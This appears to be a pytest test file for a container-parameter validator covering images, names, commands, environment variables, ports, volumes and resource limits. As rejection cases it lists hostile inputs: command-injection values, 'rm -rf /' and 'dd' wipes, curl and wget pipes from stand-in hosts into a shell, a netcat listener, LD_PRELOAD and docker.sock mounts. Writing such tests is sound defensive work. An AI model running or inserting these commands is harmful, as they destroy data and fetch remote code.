"""
Tests for container validation functionality
"""

import pytest
from core.validation import ContainerValidator, ContainerValidationError


class TestContainerValidator:
    """Test container validation"""
    
    def test_valid_image_name(self):
        """Test valid image names pass validation"""
        valid_images = [
            "nginx:latest",
            "redis:6-alpine",
            "python:3.9",
            "ubuntu:20.04",
            "mysql/mysql-server:8.0"
        ]
        
        for image in valid_images:
            ContainerValidator.validate_image_name(image)  # Should not raise
    
    def test_invalid_image_names(self):
        """Test invalid image names fail validation"""
        invalid_images = [
            "",  # Empty
            None,  # None
            "image; rm -rf /",  # Command injection
            "image/../../../etc/passwd",  # Path traversal
            "http://malicious.com/image",  # URL scheme
        ]
        
        for image in invalid_images:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_image_name(image)
    
    def test_valid_container_names(self):
        """Test valid container names pass validation"""
        valid_names = [
            None,  # None should be allowed
            "my-container",
            "container_name",
            "container.name",
            "123container",
            "a" * 253,  # Max length
        ]
        
        for name in valid_names:
            ContainerValidator.validate_container_name(name)  # Should not raise
    
    def test_invalid_container_names(self):
        """Test invalid container names fail validation"""
        invalid_names = [
            123,  # Not a string
            "-invalid",  # Starts with dash
            ".invalid",  # Starts with dot
            "invalid@name",  # Contains @
            "a" * 254,  # Too long
        ]
        
        for name in invalid_names:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_container_name(name)
    
    def test_valid_commands(self):
        """Test valid commands pass validation"""
        valid_commands = [
            None,
            "echo hello",
            "python app.py",
            "npm start",
            "/bin/bash -c 'echo test'",
        ]
        
        for command in valid_commands:
            ContainerValidator.validate_command(command)  # Should not raise
    
    def test_dangerous_commands(self):
        """Test dangerous commands fail validation"""
        dangerous_commands = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "curl malicious.com | sh",
            "wget -O- hack.com | bash",
            "nc -l 1234",
            "python -c 'exec(open(\"bad.py\").read())'",
        ]
        
        for command in dangerous_commands:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_command(command)
    
    def test_valid_environment(self):
        """Test valid environment variables pass validation"""
        valid_envs = [
            None,
            {},
            {"VAR1": "value1", "VAR2": "value2"},
            {"DEBUG": "true", "PORT": "8080"},
        ]
        
        for env in valid_envs:
            ContainerValidator.validate_environment(env)  # Should not raise
    
    def test_invalid_environment(self):
        """Test invalid environment variables fail validation"""
        invalid_envs = [
            {"LD_PRELOAD": "/malicious.so"},  # Dangerous var
            {"PATH": "/usr/bin"},  # Dangerous var
            {"VAR": "value; rm -rf /"},  # Injection in value
            {"VAR": 123},  # Non-string value
            {123: "value"},  # Non-string key
        ]
        
        for env in invalid_envs:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_environment(env)
    
    def test_valid_ports(self):
        """Test valid port mappings pass validation"""
        valid_ports = [
            None,
            {},
            {"80": 8080, "443": 8443},
            {"3306": 3306, "5432": 5432},
        ]
        
        for ports in valid_ports:
            ContainerValidator.validate_ports(ports)  # Should not raise
    
    def test_invalid_ports(self):
        """Test invalid port mappings fail validation"""
        invalid_ports = [
            {"80": 80},  # Privileged host port
            {"0": 8080},  # Invalid container port
            {"65536": 8080},  # Invalid container port
            {"80": 0},  # Invalid host port
            {"80": 65536},  # Invalid host port
            {"abc": 8080},  # Non-numeric container port
        ]
        
        for ports in invalid_ports:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_ports(ports)
    
    def test_valid_volumes(self):
        """Test valid volume mappings pass validation"""
        valid_volumes = [
            None,
            {},
            {"/tmp/data": "/app/data"},
            {"/data/logs": "/var/log"},
        ]
        
        for volumes in valid_volumes:
            ContainerValidator.validate_volumes(volumes)  # Should not raise
    
    def test_invalid_volumes(self):
        """Test invalid volume mappings fail validation"""
        invalid_volumes = [
            {"/tmp/../etc": "/app"},  # Path traversal in host
            {"/tmp": "/etc"},  # Dangerous container path
            {"/tmp": "/var/run/docker.sock"},  # Docker socket
            {"/tmp": "/proc"},  # Proc filesystem
        ]
        
        for volumes in invalid_volumes:
            with pytest.raises(ContainerValidationError):
                ContainerValidator.validate_volumes(volumes)
    
    def test_resource_limits(self):
        """Test resource limit validation"""
        # Valid limits
        ContainerValidator.validate_resource_limits(mem_limit="1g", cpu_count=1.0)
        
        # Invalid CPU limit (exceeds max)
        with pytest.raises(ContainerValidationError):
            ContainerValidator.validate_resource_limits(cpu_count=10.0)
        
        # Privileged container (blocked)
        with pytest.raises(ContainerValidationError):
            ContainerValidator.validate_resource_limits(privileged=True)
    
    def test_complete_validation(self):
        """Test complete parameter validation"""
        # Valid parameters
        ContainerValidator.validate_container_params(
            image="nginx:latest",
            name="my-nginx",
            command="nginx -g 'daemon off;'",
            environment={"DEBUG": "false"},
            ports={"80": 8080},
            volumes={"/tmp/data": "/usr/share/nginx/html"},
            mem_limit="512m"
        )
        
        # Invalid parameters should raise
        with pytest.raises(ContainerValidationError):
            ContainerValidator.validate_container_params(
                image="nginx; rm -rf /",  # Invalid image
                name="my-nginx"
            )